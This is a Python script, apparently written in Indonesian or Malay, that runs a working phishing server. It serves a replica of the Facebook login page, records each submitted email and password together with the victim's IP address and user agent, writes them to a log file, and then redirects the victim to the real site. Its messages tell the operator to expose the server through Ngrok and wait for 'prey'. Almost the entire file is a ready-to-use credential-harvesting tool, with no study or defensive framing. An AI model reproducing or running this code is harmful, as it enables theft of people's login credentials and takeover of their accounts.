#!/usr/bin/env python3

import http.server
import socketserver
import urllib.parse
import sys
import os
import threading
import time
from colorama import init, Fore, Style # Import colorama untuk warna

# Inisialisasi colorama untuk dukungan warna di terminal
init(autoreset=True)

# --- Konfigurasi Server Phishing ---
PORT = 8080 
PHISHING_HTML_FILE = "facebook_login_page.html" # Nama file HTML halaman login palsu Anda
SUCCESS_REDIRECT_URL = "https://www.facebook.com/login.php" # URL ke mana mangsa akan dialihkan setelah submit
LOG_FILE = "crimson_harvest_log.txt" # File untuk menyimpan log kredensial

# --- Banner Termux yang Cantik dan Berwarna ---
def display_banner():
    banner = f"""
{Fore.RED}{Style.BRIGHT}
███████╗██████╗ ██████╗ ██╗███╗   ███╗███████╗
██╔════╝██╔══██╗██╔══██╗██║████╗ ████║██╔════╝
█████╗  ██████╔╝██████╔╝██║██╔████╔██║█████╗  
██╔══╝  ██╔══██╗██╔══██╗██║██║╚██╔╝██║██╔══╝  
██║     ██║  ██║██║  ██║██║██║ ╚═╝ ██║███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝
{Fore.CYAN}{Style.BRIGHT}
        PHISHING BY {Fore.MAGENTA}𝐫𝐞𝐩𝐩𝟕𝟔 | 𝟑𝟎𝟑{Fore.CYAN}
{Fore.YELLOW}        ------------------------------------
{Fore.GREEN}        {Style.BRIGHT}C R I M S O N H A R V E S T   E N G I N E{Style.RESET_ALL}{Fore.YELLOW}
        ------------------------------------
{Fore.WHITE}        Sabar jika ingin berjaya
{Style.RESET_ALL}
"""
    print(banner)

# --- Halaman Login Palsu (facebook_login_page.html) ---
# Ini adalah halaman HTML yang akan disajikan kepada korban.
# Saya membuat replika yang lebih dekat dengan tampilan login Facebook.
PHISHING_HTML_CONTENT = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hBNn_g_3G41.ico">
    <style>
        body {{
            margin: 0;
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .container {{
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            max-width: 980px;
            width: 100%;
        }}
        .left-section {{
            text-align: left;
            margin-right: 30px;
            flex: 1;
        }}
        .left-section img {{
            height: 106px;
            margin: -28px;
        }}
        .left-section h2 {{
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
            color: #1c1e21;
        }}
        .right-section {{
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            width: 396px;
        }}
        .right-section input[type="text"],
        .right-section input[type="password"] {{
            width: calc(100% - 20px);
            padding: 14px 16px;
            margin-bottom: 10px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }}
        .right-section input[type="submit"] {{
            width: 100%;
            padding: 14px 16px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }}
        .right-section input[type="submit"]:hover {{
            background-color: #166fe5;
        }}
        .forgot-password {{
            text-align: center;
            margin-top: 16px;
        }}
        .forgot-password a {{
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }}
        .divider {{
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 0;
            text-align: center;
        }}
        .divider span {{
            background-color: #fff;
            padding: 0 10px;
            font-size: 13px;
            color: #606770;
        }}
        .create-new-account {{
            text-align: center;
            margin-top: 20px;
        }}
        .create-new-account a {{
            background-color: #42b72a;
            color: #fff;
            padding: 14px 16px;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            text-decoration: none;
        }}
        .create-new-account a:hover {{
            background-color: #36a420;
        }}

        @media (min-width: 980px) {{
            .container {{
                flex-direction: row;
                justify-content: space-between;
            }}
            .left-section {{
                margin-right: 80px;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <img class="fb-logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lPf0zEdXz7.svg" alt="Facebook">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        <div class="right-section">
            <form action="/" method="POST">
                <input type="text" name="email" placeholder="Email address or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <input type="submit" value="Log In">
            </form>
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
            <div class="divider"><span>or</span></div>
            <div class="create-new-account">
                <a href="#">Create New Account</a>
            </div>
        </div>
    </div>
</body>
</html>
"""

# --- Kelas Handler HTTP Kustom ---
class CrimsonHarvestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(PHISHING_HTML_CONTENT.encode('utf-8'))
        else:
            # Mengatasi permintaan favicon atau aset lainnya
            super().do_GET()

    def do_POST(self):
        if self.path == '/':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)

            # Menyesuaikan nama field untuk Facebook (email/pass)
            username = parsed_data.get('email', [''])[0]
            password = parsed_data.get('pass', [''])[0]
            
            client_ip, client_port = self.client_address
            user_agent = self.headers.get('User-Agent', 'Tidak Diketahui')

            # --- Output ke Terminal dengan Warna dan Gaya ---
            print(f"\n{Fore.RED}{Style.BRIGHT}" + "="*60)
            print(f"{Fore.GREEN}{Style.BRIGHT} BERJAYA MENDAPATKAN PASSWORD")
            print(f"{Fore.CYAN}------------------------------------------------------------")
            print(f"{Fore.YELLOW}  IP Mangsa      : {Fore.WHITE}{client_ip}")
            print(f"{Fore.YELLOW}  Port Klien     : {Fore.WHITE}{client_port}")
            print(f"{Fore.YELLOW}  User Agent     : {Fore.WHITE}{user_agent}")
            print(f"{Fore.MAGENTA}{Style.BRIGHT}  USERNAME       : {Fore.WHITE}{username}")
            print(f"{Fore.MAGENTA}{Style.BRIGHT}  PASSWORD       : {Fore.WHITE}{password}")
            print(f"{Fore.CYAN}------------------------------------------------------------")
            print(f"{Fore.RED}{Style.BRIGHT}" + "="*60 + f"{Style.RESET_ALL}\n")

            # --- Simpan ke Log File ---
            with open(LOG_FILE, 'a') as f:
                f.write(f"Timestamp: {time.ctime()}\n")
                f.write(f"IP Mangsa: {client_ip}\n")
                f.write(f"Port Klien: {client_port}\n")
                f.write(f"User Agent: {user_agent}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write("-" * 60 + "\n")

            # --- Arahkan Mangsa ke URL Sukses ---
            self.send_response(302) # Redirect
            self.send_header('Location', SUCCESS_REDIRECT_URL)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

# --- Fungsi untuk Membuat File HTML ---
def create_phishing_html():
    with open(PHISHING_HTML_FILE, "w") as f:
        f.write(PHISHING_HTML_CONTENT)
    print(f"{Fore.GREEN}[repp76] File {PHISHING_HTML_FILE} berhasil dibuat dengan tampilan Facebook yang memukau.")

# --- Fungsi Utama Server ---
def run_server():
    display_banner() # Tampilkan banner yang cantik
    create_phishing_html() # Buat file HTML sebelum server dimulai

    Handler = CrimsonHarvestHandler
    try:
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            server_thread = threading.Thread(target=httpd.serve_forever)
            server_thread.daemon = True # Biarkan thread utama Termux keluar jika ini dimatikan
            server_thread.start()
            
            print(f"{Fore.YELLOW}[repp76] CrimsonHarvest Engine berjalan di {Fore.CYAN}http://0.0.0.0:{PORT}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[repp76] Siapkan Ngrok atau Port Forwarding untuk akses internet.")
            print(f"{Fore.YELLOW}[repp76] {Style.BRIGHT}Menunggu mangsa...{Style.RESET_ALL}")
            
            # Loop utama agar program tidak langsung keluar
            while True:
                time.sleep(1) 

    except OSError as e:
        print(f"{Fore.RED}{Style.BRIGHT}[repp76] ERROR KRITIS: Tidak dapat memulai server di port {PORT}. ({e})")
        print(f"{Fore.RED}[repp76] Pastikan port tidak digunakan atau Anda memiliki izin yang cukup.")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}{Style.BRIGHT}[repp76] CrimsonHarvest Engine dimatikan. Session selesai, user! Sampai jumpa lagi!{Style.RESET_ALL}")
        sys.exit(0)

# --- Jalankan Server ---
if __name__ == "__main__":
    run_server()